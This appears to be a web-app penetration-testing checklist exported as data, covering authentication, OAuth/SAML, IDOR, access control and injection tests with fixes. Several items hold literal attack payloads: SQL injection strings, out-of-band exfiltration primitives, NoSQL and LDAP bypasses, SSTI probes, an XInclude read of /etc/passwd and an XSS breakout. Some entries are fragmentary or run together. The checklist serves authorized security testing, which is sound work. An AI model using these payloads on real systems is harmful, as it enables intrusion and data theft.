items.title: Weak Passwords and Brute-Force Vulnerabilities
items.description: Test for weak passwords and brute-force vulnerabilities. This control is evaluated under "Authentication and Session Management" during web application penetration tests and bug bounty programs. If exploited, this often leads to full account or environment compromise and must be treated as a release blocker. Document affected assets, evidence, and business owners when reporting.
items.how_to_find: In scope: map all inputs, headers, cookies, and API parameters in "Authentication and Session Management". Test case: Weak Passwords and Brute-Force Vulnerabilities. Test for weak passwords and brute-force vulnerabilities. Use Burp Proxy to intercept requests, send to Repeater/Intruder, and mutate one variable at a time. Review client-side validation separately - always confirm server-side enforcement.
items.how_to_fix: Fix root cause for "Weak Passwords and Brute-Force Vulnerabilities": apply secure defaults, server-side validation, and defense in depth. For auth issues: enforce MFA, secure session cookies (HttpOnly, Secure, SameSite), and rate limits. For injection: parameterized queries, output encoding, CSP, and allowlists. Re-test after patch and add regression tests.

items.title: Identify dangerous DOM sinks
items.description: Sinks like innerHTML, eval, and document.write fed by attacker-controllable sources enable DOM-based XSS. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Trace data flow from sources (location, postMessage, query params) into dangerous sinks; mark candidate DOM XSS paths. items.title: Map rate-limit and IP-block behavior
items.description: Understanding throttle thresholds and ban triggers prevents lockouts and informs request pacing during testing. Assessors should confirm the control in practice, not only on paper: Gradually increase request rate and observe when responses change (429, blocks, captchas); record thresholds and ban duration. items.title: Map origin exposure behind the WAF
items.description: If the origin IP is reachable directly, the WAF can be bypassed entirely, nullifying its protections. Assessors should confirm the control in practice, not only on paper: Search for origin IPs via historical DNS, CT logs, and headers; test whether the app responds when the WAF is bypassed. Common tags: waf-detection, origin-exposure, bypass.

items.description: Servers that truncate passwords silently weaken entropy without telling the user. Common tags: password-policy, truncation.

items.title: Test the password-change flow
items.description: Password change must re-verify the current password and invalidate other sessions. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Confirm the current password is required, that change is CSRF-protected, and that other active sessions are invalidated afterward. Common tags: password-policy, session, csrf.

items.description: A 6-digit OTP without rate limiting has only 1,000,000 combinations. Assessors should confirm the control in practice, not only on paper: Submit many OTP guesses; check for attempt limits, OTP rotation, and lack of a per-session brute-force window. Common tags: mfa, otp, brute-force.

items.title: Check OTP reuse and expiry
items.description: OTPs must be single-use and short-lived to resist replay. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Reuse a consumed OTP; submit an expired OTP; verify both are rejected and codes expire within a short window. Common tags: mfa, otp, replay.

items.title: Test for broken MFA-to-account binding
items.description: If the OTP step trusts a client-supplied user id, an attacker can verify their own OTP against a victim account. If exploited, this often leads to full account or environment compromise and must be treated as a release blocker. Assessors should confirm the control in practice, not only on paper: Change the username/account identifier between the credential step and the OTP-verification step; confirm the factor is bound server-side to the authenticating user. Common tags: mfa, account-takeover, authorization.

items.title: Test for weak or missing signature validation

items.title: Test for algorithm confusion (RS256 → HS256)
items.description: Switching an asymmetric token to a symmetric one lets the public key be used as the HMAC secret. If exploited, this often leads to full account or environment compromise and must be treated as a release blocker. Assessors should confirm the control in practice, not only on paper: Obtain the RSA public key, change alg from RS256 to HS256, and HMAC-sign the token with the public key as the secret. Common tags: jwt, algorithm-confusion, crypto.

items.title: Verify expiration (exp) is enforced
items.description: Tokens that never expire (or whose exp is ignored) extend the window for stolen-token abuse indefinitely. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Replay a token whose exp has passed; confirm rejection. Check that exp exists and is reasonable. Common tags: jwt, session, token-lifetime.

items.title: Test token revocation / invalidation

items.title: Verify the state parameter (CSRF on OAuth)
items.description: A missing/unchecked state parameter allows login CSRF and account linking attacks. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Remove or replay the state value; confirm the callback is rejected when state is absent or does not match the session. Common tags: oauth, csrf, state.

items.title: Check for PKCE on public clients
items.description: Authorization-code flows without PKCE are vulnerable to code interception. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Confirm code_challenge/code_verifier are used and enforced; try completing the flow without a valid verifier. Common tags: oauth, pkce, code-interception.

items.title: Flag use of the deprecated implicit flow
items.description: The implicit flow returns tokens in the URL fragment and is discouraged by the security BCP. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Check response_type=token usage; tokens in the fragment leak via Referer/history/logs. Common tags: oauth, implicit-flow, token-leakage.

items.title: Test scope handling and upgrade
items.description: Scope that is not validated server-side can be escalated by the client/attacker. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Request elevated scopes; confirm the authorization server and resource server both enforce granted scope. Common tags: oauth, scope, authorization.

items.title: Check for token/code leakage via Referer

Assessors should confirm the control in practice, not only on paper: Inspect outbound requests after the callback for code/token in Referer to external hosts; check Referrer-Policy. Common tags: oauth, token-leakage, referer.

items.title: Verify id_token signature validation
items.description: An unvalidated id_token signature lets an attacker forge identity claims (inherits all JWT signature attacks). If exploited, this often leads to full account or environment compromise and must be treated as a release blocker. Assessors should confirm the control in practice, not only on paper: Apply JWT signature/alg-confusion/none tests to the id_token; confirm signature and issuer are validated against the OP JWKS. Common tags: oidc, jwt, id-token.

items.title: Test aud/azp and email_verified claim trust
items.description: RPs that trust unverified claims (e.g. email_verified=false) can be tricked into account linking/takeover. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Check whether aud/azp are validated and whether email_verified is required before trusting the email for account matching. Common tags: oidc, claims-validation, account-takeover.

items.title: Test SAML response/assertion signature validation
items.description: Unsigned or unverified assertions allow forged authentication. If exploited, this often leads to full account or environment compromise and must be treated as a release blocker. Assessors should confirm the control in practice, not only on paper: Strip/modify the signature, or sign with your own key; confirm the SP rejects assertions not signed by the trusted IdP. Common tags: saml, sso, xml-signature.

items.title: Test for XML Signature Wrapping (XSW)
items.description: XSW moves the signed element while injecting an attacker-controlled assertion the SP actually processes. If exploited, this often leads to full account or environment compromise and must be treated as a release blocker. Assessors should confirm the control in practice, not only on paper: Apply the XSW1–XSW8 patterns (SAML Raider) to wrap a malicious assertion around the signed one; check whether the forged identity is accepted. Common tags: saml, xsw, xml-signature.

items.title: Test for XML comment injection in NameID
items.description: Comment injection can cause the SP to parse only part of the NameID, impersonating another user. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Insert a comment into the NameID (e.g. admin<!---->@evil.com) and observe whether the SP canonicalizes to a different identity. Common tags: saml, comment-injection, account-takeover.

items.title: Verify assertion conditions (audience, validity window, recipient)
items.description: Ignoring NotBefore/NotOnOrAfter, AudienceRestriction, or Recipient enables replay and cross-SP reuse. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Replay an expired assertion and one with a wrong Audience/Recipient; confirm rejection. Common tags: saml, replay, validation.

items.title: Test the SAML parser for XXE

items.title: Test for session fixation
items.description: If the session id is not rotated on login, an attacker-fixed id survives authentication. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Capture the pre-auth session id; log in; confirm a new id is issued (the old one no longer authenticates). Common tags: session, fixation, authentication.

items.title: Verify session cookie attributes
items.description: Session cookies need HttpOnly, Secure, and SameSite to resist theft and CSRF. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Inspect Set-Cookie for the session cookie; confirm HttpOnly, Secure, SameSite, sensible scope/path, and no overly broad Domain. Common tags: session, cookies, csrf.

items.title: Test idle and absolute session timeout
items.description: Sessions that never expire leave stolen tokens valid indefinitely. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Common tags: session, timeout, lifecycle.

items.title: Test for password-reset poisoning (Host header)
items.description: If reset links are built from the Host header, an attacker can poison them to capture tokens. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Inject Host/X-Forwarded-Host pointing to your domain; check whether the reset email link uses it (token exfil). Common tags: password-reset, host-header, account-takeover.

items.title: Check for reset-token leakage via Referer
items.description: A token in the reset URL can leak to third parties via the Referer header when the page loads external resources. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Open the reset link and inspect outbound requests for the token in Referer; check Referrer-Policy. Common tags: password-reset, token-leakage, referer.

items.title: Verify credentials are sent only over TLS
items.description: Credentials over HTTP are trivially intercepted. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Confirm login and all authenticated traffic use HTTPS, with no cleartext fallback and HSTS set. Common tags: transport, tls, authentication.

items.title: Assess remember-me token design
items.description: Predictable or non-revocable persistent tokens enable long-term account takeover. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Common tags: remember-me, session, token.

items.title: Verify persistent login is revoked on credential change
items.description: Remember-me tokens that survive a password reset undermine recovery from compromise. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Set remember-me, change the password from another session, then replay the persistent token; it must be invalidated. Common tags: remember-me, session, revocation.

sections.title: Authorization — IDOR / Insecure Direct Object Reference

items.title: Sequential / predictable object identifiers
items.description: Auto-incrementing or otherwise predictable ids let an attacker walk the keyspace and read or modify other users’ objects. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Capture a request referencing your own object (e.g. /api/orders/1042) and increment/decrement the id. If you receive another user’s data without an authorization error, IDOR is present. Common tags: idor, access-control, owasp-a01.

Re-test after patch and add regression tests.

items.title: UUID / GUID guessing and predictability
items.description: Non-random or version-1 UUIDs, or UUIDs leaked elsewhere in the app, defeat the assumption that an opaque id is unguessable. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Collect several object UUIDs and check for predictability (timestamp-based v1, sequential counters). Confirm whether server-side authorization still applies when a valid-but-foreign UUID is supplied. Common tags: idor, uuid, access-control.

items.title: Mass IDOR / bulk object enumeration
items.description: List, export, or batch endpoints may apply weaker authorization than single-object endpoints, enabling bulk harvesting of foreign records. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Test list/search/export endpoints and batch (array of ids) parameters. Verify each returned record is filtered to the caller’s scope and not just to the requested ids. Common tags: idor, enumeration, access-control.

items.title: IDOR in nested / related objects
items.description: Authorization checked on a parent object but not on nested children (e.g. /accounts/{mine}/invoices/{foreign}) allows lateral access. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: For nested routes, swap only the child identifier while keeping a parent you own. Confirm the server validates ownership of the leaf object, not just the path prefix. Common tags: idor, nested, access-control.

items.title: Blind IDOR via observable side effects
items.description: Even when a response body is generic, side effects (emails, notifications, timing, state changes) can confirm unauthorized object access or mutation. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Trigger an action against a foreign id and observe out-of-band side effects — a notification email, a record updated elsewhere, or differential timing/status codes that reveal success. Common tags: idor, blind, access-control.

items.title: IDOR on write operations (PUT / PATCH / DELETE)
items.description: Read endpoints may be authorized correctly while the corresponding write/delete endpoints are not, allowing tampering with or destruction of foreign objects. If exploited, this often leads to full account or environment compromise and must be treated as a release blocker. Assessors should confirm the control in practice, not only on paper: For each readable object, replay the PUT/PATCH/DELETE against a foreign id. Confirm the mutation is rejected with a proper 403, not silently applied. Common tags: idor, write, access-control.

items.title: GUID / identifier leakage in responses
items.description: APIs that return other users’ GUIDs, internal ids, or object keys in unrelated responses hand an attacker the references needed for IDOR. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Review responses (search results, autocomplete, error messages, embedded JSON) for foreign object identifiers, then test whether those identifiers are directly usable against object endpoints. Common tags: idor, information-disclosure, access-control.

items.title: Accessing admin functions as a standard user
items.description: Administrative actions exposed without a server-side privilege check let any authenticated user perform privileged operations. If exploited, this often leads to full account or environment compromise and must be treated as a release blocker. Assessors should confirm the control in practice, not only on paper: Capture privileged requests while logged in as an admin, then replay them with a standard-user session. Confirm each is rejected with a 403, not executed. Common tags: privilege-escalation, access-control, owasp-a01.
items.how_to_find: In scope: map all inputs, headers, cookies, and API parameters in "Authorization — Vertical Privilege Escalation". Test case: Accessing admin functions as a standard user. Administrative actions exposed without a server-side privilege check let any authenticated user perform privileged operations. If exploited, this often leads to full account or environment compromise and must be treated as a release blocker. Assessors should confirm the control in practice, not only on paper: Capture privileged requests while logged in as an admin, then replay them with a standard-user session. Confirm each is rejected with a 403, not executed. Common tags: privilege-escalation, access-control, owasp-a01. Use Burp Proxy to intercept requests, send to Repeater/Intruder, and mutate one variable at a time. Review client-side validation separately - always confirm server-side enforcement.
items.how_to_fix: Fix root cause for "Accessing admin functions as a standard user": apply secure defaults, server-side validation, and defense in depth. For auth issues: enforce MFA, secure session cookies (HttpOnly, Secure, SameSite), and rate limits. For injection: parameterized queries, output encoding, CSP, and allowlists. Re-test after patch and add regression tests.

items.title: Forced browsing to privileged endpoints
items.description: Privileged pages and APIs merely hidden from the UI (e.g. /admin, /internal) but not access-controlled can be reached directly. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Enumerate admin/internal paths from JS bundles, sitemaps, and wordlists, then request them as a low-privileged user. Confirm authorization is enforced regardless of UI visibility. Common tags: privilege-escalation, forced-browsing, access-control.

items.title: Parameter-based role escalation
items.description: Trusting a client-supplied role/level parameter (e.g. role=admin, isAdmin=true) on requests permits trivial vertical escalation. If exploited, this often leads to full account or environment compromise and must be treated as a release blocker. Assessors should confirm the control in practice, not only on paper: Add or modify role/privilege parameters in requests, cookies, and JSON bodies. Confirm the server derives privilege from the session, not from client-controlled input. Common tags: privilege-escalation, parameter-tampering, access-control.

Confirm the server derives privilege from the session, not from client-controlled input. Common tags: privilege-escalation, parameter-tampering, access-control. items.title: Hidden admin parameters and feature flags
items.description: Undocumented query/body parameters (e.g. debug=true, admin=1) can unlock privileged behavior or bypass checks. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Use parameter-mining wordlists against privileged-looking endpoints and diff responses for behavioral changes that indicate a hidden privileged toggle. Common tags: privilege-escalation, parameter-discovery, access-control.

items.title: Accessing peer resources at the same privilege level
items.description: Same-role users should be isolated from one another; missing ownership checks let one user read or modify another’s data. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Create two same-role accounts and attempt to access account B’s resources using account A’s session and B’s identifiers. Confirm a 403 / not-found, not the data. Common tags: privilege-escalation, horizontal, access-control.

items.title: Tenant / account id swapping
items.description: Account or tenant identifiers carried in paths, headers, or bodies that are not bound to the session enable cross-account access. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Substitute a foreign account/tenant id in every place it appears (URL, X-Account-Id header, JSON body) and confirm the server rejects the mismatch rather than honoring the client value. Common tags: privilege-escalation, horizontal, multi-tenancy.

items.title: Email / username pivot
items.description: Endpoints that act on a user identified by an email/username parameter rather than by session allow takeover of arbitrary accounts. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Find requests carrying an email/username (profile update, password reset, lookup) and substitute a victim’s value. Confirm the action targets the session user, not the supplied identity. Common tags: privilege-escalation, horizontal, account-takeover.

items.title: Missing function-level access control
items.description: Each privileged function must be checked server-side; relying on menu hiding or a single gateway check leaves functions reachable. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Enumerate every privileged function and confirm each enforces authorization independently. Test that lower roles cannot invoke them even with a valid session and correct request shape. Common tags: rbac, access-control, owasp-a01.

items.title: Client-side-only enforcement
items.description: Hiding or disabling controls in JavaScript without a matching server check means the underlying API is fully accessible. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Identify UI elements gated by client logic (disabled buttons, hidden routes), then call the backing API directly. Confirm the server independently enforces the same restriction. Common tags: rbac, client-side, access-control.

items.title: Role confusion / overlapping permissions
items.description: Ambiguous or overlapping role definitions can grant unintended permissions, especially where multiple roles map to one identity. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Map roles to permissions and test boundary cases: users with multiple roles, default roles, and roles inherited from groups. Confirm effective permissions match the least-privilege intent. Common tags: rbac, access-control.

items.title: Privilege persistence after downgrade
items.description: Tokens, sessions, or cached permissions issued before a role downgrade may continue to grant the old, higher privileges. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Obtain a session as a high-privilege user, downgrade the role server-side, then continue using the original token/session. Confirm privileges are revoked immediately rather than at next login. Common tags: rbac, session-management, access-control.

items.title: Cross-tenant data access
items.description: Queries that filter only by object id and not by tenant scope expose other tenants’ records. If exploited, this often leads to full account or environment compromise and must be treated as a release blocker. Assessors should confirm the control in practice, not only on paper: From tenant A, request identifiers belonging to tenant B across all endpoints. Confirm every query is scoped to the caller’s tenant server-side, not just by the supplied id. Common tags: multi-tenancy, access-control, data-isolation.

items.title: Tenant id tampering in JWT / headers
items.description: When tenant context comes from a client-supplied JWT claim or header, an attacker can edit it to impersonate another tenant. If exploited, this often leads to full account or environment compromise and must be treated as a release blocker. Assessors should confirm the control in practice, not only on paper: Decode the JWT/headers carrying tenant context and modify the tenant claim (re-signing or exploiting weak verification). Confirm the server validates the claim against the authenticated identity. Common tags: multi-tenancy, jwt, parameter-tampering.

items.title: Shared-cache cross-tenant leakage
items.description: Caches keyed without tenant context (CDN, app-level, or proxy) can serve one tenant’s data to another. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Inspect cache keys and Vary/Cache-Control headers for tenant-scoped responses. Request a resource as tenant A then B and confirm no cached, tenant-specific content crosses over. Common tags: multi-tenancy, caching, data-isolation.

items.title: Setting privileged fields (isAdmin / role) via extra params
items.description: Frameworks that auto-bind request fields to models let an attacker include privileged attributes never shown in the UI. If exploited, this often leads to full account or environment compromise and must be treated as a release blocker. Assessors should confirm the control in practice, not only on paper: Add fields like isAdmin, role, verified, balance to create/update requests and confirm the server ignores or rejects them rather than persisting the privileged value. Common tags: mass-assignment, privilege-escalation, access-control.

items.title: Nested object injection
items.description: Deep object graphs allow injecting privileged sub-objects (e.g. user.permissions, account.owner) that bypass top-level field filters. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Submit nested JSON structures targeting related entities and confirm the server does not bind unauthorized nested attributes during create/update. Common tags: mass-assignment, injection, access-control.

items.title: JSON vs form parameter smuggling
items.description: Switching content type (JSON, form-encoded, XML) can reach a different binder that applies weaker allow-listing of fields. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Resend the same write request with alternate content types and parameter encodings, injecting privileged fields. Confirm field filtering is consistent across all parsers. Common tags: mass-assignment, content-type, access-control.

items.title: Unlinked / orphaned endpoints
items.description: Endpoints no longer linked in the UI (deprecated, debug, backup) often retain weak or no authorization. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Harvest endpoints from JS bundles, source maps, sitemaps, and history, then request each as an unauthenticated or low-privileged user. Confirm authorization is enforced. Common tags: forced-browsing, access-control, discovery.

items.title: Directory / endpoint guessing
items.description: Predictable path schemes and common directory names let an attacker brute-force their way to protected functionality. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Fuzz directories and endpoints with curated wordlists and observe status codes and lengths. Confirm discovered resources still enforce authorization rather than relying on obscurity. Common tags: forced-browsing, fuzzing, access-control.

items.title: HTTP method-based access bypass
items.description: Authorization enforced for GET/POST but not for HEAD, PUT, or other verbs allows the control to be bypassed by switching methods. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Replay protected requests with alternate HTTP methods (HEAD, PUT, PATCH, OPTIONS, arbitrary verbs) and confirm authorization is enforced uniformly across all methods. Common tags: forced-browsing, http-method, access-control.

items.title: Case / encoding bypass of path ACLs
items.description: ACLs matching exact path strings can be bypassed with case changes, URL encoding, trailing slashes, or path normalization quirks. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Against a path blocked by an ACL, try case variations (/Admin), encodings (%2e, %2f, double-encoding), trailing slashes, and path-segment tricks. Confirm the gateway normalizes before authorizing. Common tags: forced-browsing, encoding, access-control.

items.title: URL-override header access bypass
items.description: Reverse proxies and frameworks that honour X-Original-URL, X-Rewrite-URL, or X-Original-Path can route an allowed front-end path to a restricted back-end one, bypassing the gateway ACL. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Request an allowed path while setting X-Original-URL / X-Rewrite-URL (and X-Forwarded-Path variants) to a protected endpoint; confirm whether the back end serves the restricted resource. Test path-confusion between front-end and origin. Common tags: forced-browsing, header-bypass, access-control.

items.title: Referer-based access control
items.description: Apps that gate sensitive functionality on the Referer header (e.g. trusting that the user arrived from an admin page) can be bypassed by forging or omitting the header. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Request a protected action directly while spoofing Referer to the expected origin page, and again with no Referer; if access is granted based solely on Referer, the control is bypassable. Common tags: forced-browsing, referer, access-control.

items.title: Test for error-based SQL injection
items.description: Verbose database errors leak query structure and let an attacker extract data directly through error messages. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Inject a single quote, double quote, and SQL meta-characters into each parameter and observe responses for database error strings (e.g. "SQL syntax", ORA-, PG::, SQLSTATE). Use extractvalue()/updatexml() or CAST tricks to force data into error output. Common tags: sql-injection, database, owasp-a03.

items.title: Test for UNION-based SQL injection
items.description: UNION SELECT lets an attacker append a second result set, extracting arbitrary columns and tables in the HTTP response. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Determine the number of columns with ORDER BY n or UNION SELECT NULL,NULL,..., identify which columns are reflected and their string-compatible type, then exfiltrate data via UNION SELECT (e.g. username,password FROM users). Common tags: sql-injection, union, cwe-89.

items.title: Test for blind boolean-based SQL injection
items.description: Even without visible output, differing responses to true/false conditions allow byte-by-byte data extraction. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Inject conditions like ' AND 1=1-- versus ' AND 1=2-- and compare response content/length/status. Confirm exploitability by extracting data with SUBSTRING() comparisons inside the boolean condition. Common tags: sql-injection, blind, owasp-a03.

items.title: Test for blind time-based SQL injection
items.description: When no boolean difference is observable, deliberate time delays confirm injection and enable inference-based extraction. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Inject database-specific delay functions (SLEEP(5), pg_sleep(5), WAITFOR DELAY '0:0:5', dbms_pipe.receive_message) inside a conditional and measure response time. Verify the delay is conditional on injected logic, not a fixed timeout. Common tags: sql-injection, blind, time-based.

items.title: Test for second-order SQL injection
items.description: Input stored safely in one request but later concatenated into a query elsewhere bypasses input-time filtering. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Store SQL payloads in fields that are persisted (username, profile, comments), then trigger downstream features that re-use the stored value in a query (account update, reporting, admin views) and observe delayed injection effects. Common tags: sql-injection, second-order, cwe-89.

items.title: Test for ORM injection
items.description: Raw query builders, string interpolation, or unsafe ORM filter parsing can reintroduce SQL injection despite an abstraction layer. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Inspect endpoints that accept sort/filter/field parameters mapped into ORM raw() or whereRaw() calls. Inject SQL meta-characters into ORM filter keys/operators and look for HQL/JPQL/Sequelize/Hibernate injection symptoms. Common tags: sql-injection, orm, cwe-89.

items.title: Test WAF bypass and encoding for SQLi
items.description: WAFs frequently block obvious payloads but can be evaded with encoding, comments, and case/keyword tricks, leaving the underlying flaw exploitable. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Try inline comments (/**/), case variation (sElEcT), URL/double-URL/unicode encoding, whitespace alternatives, and keyword splitting to bypass signature filters. Confirm the bypass reaches the database with a benign test before weaponizing. Common tags: sql-injection, waf-bypass, evasion.

items.title: Test for out-of-band SQL injection
items.description: When in-band channels are unavailable, triggering DNS or HTTP callbacks from the database confirms injection and exfiltrates data. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Use database OOB primitives (xp_dirtree, LOAD_FILE/UNC paths, UTL_HTTP, master..xp_dirtree, OPENROWSET) to trigger DNS/HTTP lookups to a Collaborator/Interactsh domain, embedding extracted data in the subdomain. Common tags: sql-injection, out-of-band, exfiltration.

items.title: Test for stacked query injection
items.description: Drivers that allow multiple statements per query enable INSERT/UPDATE/DROP and procedure execution beyond the original statement. If exploited, this often leads to full account or environment compromise and must be treated as a release blocker. Assessors should confirm the control in practice, not only on paper: Append a second statement with a semicolon (e.g. '; UPDATE users SET ...-- or '; WAITFOR DELAY '0:0:5'--) and verify execution. Test on stacks that commonly allow it (SQL Server, PostgreSQL) and confirm via side effects. Common tags: sql-injection, stacked-queries, cwe-89.

items.title: Test for authentication bypass via SQLi
items.description: Injection in login queries can short-circuit credential checks and grant access without valid credentials. If exploited, this often leads to full account or environment compromise and must be treated as a release blocker. Assessors should confirm the control in practice, not only on paper: Submit payloads like ' OR '1'='1'-- and admin'-- in username/password fields, and test ' OR 1=1 LIMIT 1-- to land on the first user. Confirm whether the session is established as a real user. Common tags: sql-injection, authentication, owasp-a07.

items.title: Test for operator injection ($ne/$gt)
items.description: Passing query operators instead of scalar values lets an attacker alter MongoDB query semantics. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Convert JSON/body parameters to objects with operators, e.g. {"password":{"$ne":null}} or {"age":{"$gt":""}}, and observe whether the query returns unexpected records. Test param[$ne]=x style in URL-encoded bodies too. Common tags: nosql-injection, mongodb, owasp-a03.

items.title: Test for argument injection
items.description: Even where shell metacharacters are filtered, injecting extra CLI flags into a binary can change its behavior dangerously. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: For inputs passed as arguments to tools (curl, tar, ffmpeg, find, git), inject leading dashes or flags (e.g. --output, -o, --upload-file, --config) to coerce file read/write, SSRF, or option-driven execution. Common tags: command-injection, argument-injection, cwe-88.

items.title: Test for out-of-band command injection

items.title: Test filter bypass via separators and encoding

items.title: Detect SSTI with a polyglot probe
items.description: A simple math/concat probe quickly reveals whether input is evaluated as template code. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Inject ${7*7}, {{7*7}}, <%= 7*7 %>, #{7*7}, and a known SSTI polyglot into each reflected parameter; a rendered 49 (or errors keyed to a template engine) indicates SSTI. Common tags: ssti, template-injection, owasp-a03.

items.title: Escalate Jinja2/Twig SSTI to RCE
items.description: Python and PHP template engines expose object internals that reach OS command execution. items.title: Test for billion laughs DoS
items.description: Recursive entity expansion can exhaust memory/CPU and take down the service. While not always immediately exploitable, this weakness expands attack surface and should be remediated within the current sprint. Assessors should confirm the control in practice, not only on paper: Submit a nested entity-expansion payload (lol1..lol9) ONLY with explicit authorization, ideally against a non-production target, and observe whether parsing causes resource exhaustion. Prefer a small, bounded probe to confirm expansion without full DoS. Common tags: xxe, dos, cwe-776.

items.title: Test for XInclude attacks
items.description: When you cannot control the full XML document, XInclude can still pull external resources into a sub-element. This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Assessors should confirm the control in practice, not only on paper: Inject <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo> into a server-controlled XML field and confirm the included content is returned. Common tags: xxe, xinclude, file-disclosure.

items.title: Test for LDAP authentication bypass
items.description: Filter injection in bind/search queries can match any account and grant access. If exploited, this often leads to full account or environment compromise and must be treated as a release blocker. Assessors should confirm the control in practice, not only on paper: Submit payloads like *)(uid=*))(|(uid=* or *)(&) and admin)(&)) into username/password fields and check whether authentication succeeds without valid credentials. Common tags: ldap-injection, authentication, owasp-a07.

items.title: Test for blind LDAP injection

This is a high-impact finding that attackers frequently chain with other issues to escalate access or exfiltrate data. Common tags: ldap-injection, blind, cwe-90.

items.title: Test attribute context breakouts
items.description: Reflection inside an HTML attribute can be escaped to inject new attributes or close the tag and run script. Assessors should confirm the control in practice, not only on paper: When input lands inside an attribute, test breaking out with a double or single quote and injecting event handlers (e.g. " onmouseover=alert(1) x="). Where breakout is blocked, try event handlers if the value is unquoted. Common tags: xss, attribute, context.

